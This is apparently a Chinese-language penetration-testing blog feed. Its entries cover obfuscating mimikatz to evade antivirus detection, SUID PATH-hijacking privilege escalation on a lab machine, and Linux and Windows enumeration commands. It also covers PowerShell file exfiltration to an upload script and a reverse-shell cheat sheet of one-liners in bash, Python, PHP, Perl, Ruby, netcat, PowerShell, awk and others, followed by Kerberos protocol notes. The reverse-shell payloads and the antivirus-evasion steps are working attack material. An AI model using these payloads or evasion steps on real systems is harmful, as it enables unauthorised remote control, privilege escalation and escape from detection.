alt="image-20210530194450066"></p><p>调用Confuse_gzip_xor对mimikatz进行混淆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python confuse_tools.py -s mimi.txt -d mimi.raw -f Confuse_gzip_xor</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210530193157125.png" alt="image-20210530193157125"></p><p>我们可以获取到随机生成的xor_key。这个key，请自行解密。</p><h2 id="vt查杀"><a href="#vt查杀" class="headerlink" title="vt查杀"></a>vt查杀</h2><p>mimi.txt（混淆前）</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210530193400861.png" alt="image-20210530193400861"></p><p>mimi.raw （混淆后）</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210530193431499.png" alt="image-20210530193431499"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基于suid的Linux环境变量劫持提权</title>
      <link href="2021/04/16/%E5%9F%BA%E4%BA%8Esuid%E7%9A%84Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83/"/>
      <url>2021/04/16/%E5%9F%BA%E4%BA%8Esuid%E7%9A%84Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="枚举suid"><a href="#枚举suid" class="headerlink" title="枚举suid"></a>枚举suid</h2><p>搜索suid文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210416184054834.png"></p><p>strings查看文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings &#x2F;usr&#x2F;bin&#x2F;menu</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210416184229801.png"></p><h2 id="劫持ifconfig命令"><a href="#劫持ifconfig命令" class="headerlink" title="劫持ifconfig命令"></a>劫持ifconfig命令</h2><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x2F;bin&#x2F;bash &gt; ifconfig</span><br><span class="line">chmod 777 ifconfig</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;kenobi:$PATH</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210416184317012.png"></p><p>运行menu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210416184356460.png"></p><p>获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210416184424756.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>特权提升枚举</title>
      <link href="2021/04/06/%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%9E%9A%E4%B8%BE/"/>
      <url>2021/04/06/%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>获取当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>获取当前用户基本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p>获取所有用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>获取主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><p>获取系统基本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>获取进程信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><p>查看网络配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p>获取网络路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sbin&#x2F;route</span><br></pre></td></tr></table></figure><p>查看网络连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss -anp</span><br><span class="line">netstat -anp</span><br></pre></td></tr></table></figure><p>获取防火墙配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -Hs iptables &#x2F;etc&#x2F;*</span><br></pre></td></tr></table></figure><p>获取计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lah &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><p>获取已安装的软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l</span><br></pre></td></tr></table></figure><p>查找可读可写目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>获取卸载驱动器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;fstab</span><br><span class="line">mount</span><br><span class="line">&#x2F;bin&#x2F;lsblk</span><br></pre></td></tr></table></figure><p>获取系统内核模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure><p>获取程序驱动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sbin&#x2F;modinfo libata</span><br></pre></td></tr></table></figure><p>获取suid二进制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>获取当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>获取详细用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username</span><br></pre></td></tr></table></figure><p>查看用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>获取主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><p>英文系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; &#x2F;C:&quot;System Type&quot;</span><br></pre></td></tr></table></figure><p>中文系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo|findstr &#x2F;B &#x2F;C:&quot;OS名称&quot; &#x2F;C:&quot;OS版本&quot; &#x2F;C:&quot;系统类型&quot;</span><br></pre></td></tr></table></figure><p>获取进程信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;SVC</span><br></pre></td></tr></table></figure><p>网络配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p>路由信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>网络连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netatat -ano</span><br></pre></td></tr></table></figure><p>获取当前防火墙状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show currentprofile</span><br></pre></td></tr></table></figure><p>查看防火墙规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name&#x3D;all</span><br></pre></td></tr></table></figure><p>获取计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure><p>获取已安装的软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name, version, vendor</span><br></pre></td></tr></table></figure><p>获取补丁信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption, Description, HotFixID, InstalledOn</span><br></pre></td></tr></table></figure><p>获取可读可写目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files&quot;</span><br><span class="line">Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</span><br></pre></td></tr></table></figure><p>获取卸载驱动器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mountvol</span><br></pre></td></tr></table></figure><p>获取内核模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery.exe &#x2F;v &#x2F;fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path</span><br></pre></td></tr></table></figure><p>获取设备驱动程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</span><br></pre></td></tr></table></figure><p>获取自动提升二进制权限的程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><h2 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a>  </p><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p><a href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows文件传输</title>
      <link href="2021/04/05/Windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
      <url>2021/04/05/Windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<p>测试文件：wget.exe 302kb</p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>hex编码exe文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe2hex wget.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405173228000.png" alt="image-20210405173228000"></p><p>复制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat nc.cmd | xclip -selection clipboard</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405173309408.png" alt="image-20210405173309408"></p><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405173325112.png" alt="image-20210405173325112"></p><p>cmd粘贴执行</p><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405173409587.png" alt="image-20210405173409587"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>服务器 请勿将文件上传到有php执行权限的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">move_upload_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],&#39;U:\data_file\&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405175010418.png" alt="image-20210405175010418"></p><p>客户机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#39;, &#39;wget.exe&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405175104272.png" alt="image-20210405175104272"></p><p>传输完成</p><p><img src="https://gitee.com/magisec/images/raw/main/image-20210405175157956.png" alt="image-20210405175157956"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell备忘录</title>
      <link href="2021/04/05/%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2021/04/05/%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip-address&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip-address&quot;,port);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip-address&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><p>攻击机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:&#96;tty&#96;,raw,echo&#x3D;0 TCP-L:port</span><br></pre></td></tr></table></figure><p>客户机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;shm exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:ip-address:port</span><br></pre></td></tr></table></figure><h2 id="prel"><a href="#prel" class="headerlink" title="prel"></a>prel</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$ip&#x3D;&quot;ip-address&quot;;$port&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($port,inet_aton($ip))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><h2 id="prel-windows"><a href="#prel-windows" class="headerlink" title="prel windows"></a>prel windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;ip-address:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;ip-address&quot;,port).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  ip-address port -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip-address&#x2F;port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;ip-address&quot;,port);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure><h2 id="xTerm"><a href="#xTerm" class="headerlink" title="xTerm"></a>xTerm</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display ip-address:port</span><br></pre></td></tr></table></figure><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;BEGIN &#123;s &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;ip-address&#x2F;port&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !&#x3D; &quot;exit&quot;) close(s); &#125;&#125;&#39; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux切换交互shell</title>
      <link href="2021/04/05/Linux%E5%88%87%E6%8D%A2%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%A4%96%E5%A3%B3/"/>
      <url>2021/04/05/Linux%E5%88%87%E6%8D%A2%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%A4%96%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<p>攻击机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/606abb6f78ba2" alt="image-20210405151207024"></p><p>客户机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.132.154&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/606abb75aab96" alt="image-20210405151520039"></p><p>没有切换交互式shell，只能执行非交互式命令。</p><p><img src="https://img.rruu.net/image/606abb7ca1c0d" alt="image-20210405151545879"></p><p>执行sudo su测试</p><p><img src="https://img.rruu.net/image/606abb85c6c48" alt="image-20210405151642486"></p><p>切换交互式shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/606abb8e87522" alt="image-20210405151812899"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos协议关系</title>
      <link href="2021/03/23/Kerberos%E5%8D%8F%E8%AE%AE%E5%85%B3%E7%B3%BB/"/>
      <url>2021/03/23/Kerberos%E5%8D%8F%E8%AE%AE%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>假设HR是可信任的，公司实行的是工资保密制度。</p><h2 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h2><p>如果二狗想给老板发消息，就要先通过HR来确定二狗就是二狗，然后HR再给二狗一个身份鉴定证书专门用于于老板聊天。</p><p>如何确定二狗就是二狗？</p><ul><li>消息A 以二狗的工资作为加密密钥对12345</li><li>消息B 将二狗的聊天窗口和聊天时间和123456加密到一个文件中</li><li>消息C 消息B+老板大黄的名字（与老板对话）</li><li>消息D 消息A解密以后，得到12345。将12345做key加密HR聊天窗口和时间</li></ul><p>HR怎么通过消息确定二狗即二狗？</p><p>正向思考</p><ul><li>HR通过解密消息C得到了聊天窗口与聊天时间，以及123456。</li><li>通过解密消息C得到的123456来解密消息D，得到二狗和HR的聊天窗口截图以及聊天时间。</li><li>比对聊天窗口时间确认二狗是二狗</li></ul><p>反向思考</p><p>假设这是一只假二狗</p><ul><li>假二狗不知道真二狗的公司，无法解密得到关键数字12345，也就没办法使用12345加密消息D。消息B是不被二狗操作的，二狗不可解密，只能由HR解密。</li></ul><h2 id="身份鉴证"><a href="#身份鉴证" class="headerlink" title="身份鉴证"></a>身份鉴证</h2><p>假设公司老板的公司为4块3毛1角</p><ul><li>消息E 老板工资，二狗聊天窗口，聊天时间，45678加密</li><li>消息F HR利用消息C中解密得到的12345加密45678</li></ul><p>二狗收到消息</p><ul><li>用12345 解密消息F，得到45678.</li><li>消息G 用45678加密HR聊天窗口与聊天时间</li></ul><p>老板收到消息</p><ul><li>用自己工资解密消息E得到45678</li><li>使用解密消息E得到的45678解密消息G</li><li>对比消息E与消息G 解密后的聊天窗口</li></ul><p>补充：假老板不知道真老板的工资，自然无法冒充老板。</p><h2 id="故事解密"><a href="#故事解密" class="headerlink" title="故事解密"></a>故事解密</h2><p>故事中的角色与词汇转换Kerberos协议</p><ul><li>二狗 Client</li><li>HR KDC</li><li>老板大黄  Service/Server</li><li>二狗的工资 Client NTLM Hash</li><li>HR的工资 krbtgt NTLM Hash</li><li>老板的工资 Service/Server NTLM Hash</li><li>HR工资加密的截图，时间和12345  TGT 黄金票据</li><li>老板工资加密的截图，时间和45678 TGS 白银票据</li><li>12345    Client/TGS Sessionkey     </li><li>45678    Client/Service Sessionkey </li><li>聊天窗截图 Client ID</li><li>聊天时间 Timestamp 时间戳</li></ul><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>真的很佩服作者，可以通过一个故事生动形象的使读者理解Kerberos的认证流程。</p><p><a href="https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/">https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos之TGS_REQ和TGS_REP学习</title>
      <link href="2021/03/23/Kerberos%E4%B9%8BTGS_REQ%E5%92%8CTGS_REP%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/03/23/Kerberos%E4%B9%8BTGS_REQ%E5%92%8CTGS_REP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="TGS阶段介绍"><a href="#TGS阶段介绍" class="headerlink" title="TGS阶段介绍"></a>TGS阶段介绍</h2><p>在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP获得TGT票据，向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。在这里微软引入了两个扩展，S4U2SELF和S4U2PROXY。</p><h2 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h2><ul><li>msg-type 请求类型 TGS_REQ对应的是KRB_TGS_REQ</li><li>PA-DATA 请求数据<ol><li>AP_REQ 存放TGT票据</li><li>PA_FOR_USER 用于指示用户身份，该标识符由用户名与域名组成。</li><li>PA_PAC_OPTIONS</li></ol></li><li>REQ_BODY<ol><li>sanme 要请求的服务，TGS_REP获得的ticket是由用户hash加密的。如果指定服务是krbtgt，那么TGS票据可以当TGT票据使用。</li><li>Addtion Ticket 附加票据</li></ol></li></ul><h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><ul><li>msg-type 返回类型 AS_REQ对应的是KRB_TGS_REQ</li><li>ticket 用于AP_REQ的认证，其中enc_part是加密的，用户不可读取。在AS_REQ中使用krbtgt的hash进行加密，而TGS_REQ里面使用的是请求服务的hash。如果拥有服务的hash，我们即可自己为自己制作一个白银票据。我们可以通过爆破enc_part，获得服务的hash。</li><li>enc_part 不是ticket的enc_part，可以解密，key是上一次AS_REQ返回的session_key,导入session_key解密即可获取到encryptionkey作为下阶段的认证密钥。</li></ul><h2 id="S4U2self"><a href="#S4U2self" class="headerlink" title="S4U2self"></a>S4U2self</h2><p>S4U2SELF使得服务可以代表用户获取服务本身的Kerberos票据。服务可以获取用户的可转发的TGS票据，用于后期不使用Kerberos方式服务进行身份验证。</p><p>重点：服务代表用户获取针对服务自身的Kerberos票据的过程，服务是不需要用户凭据的。</p><p>前提条件：已有通过KDC验证的TGT</p><p><img src="https://img.rruu.net/image/606abbc3b4410" 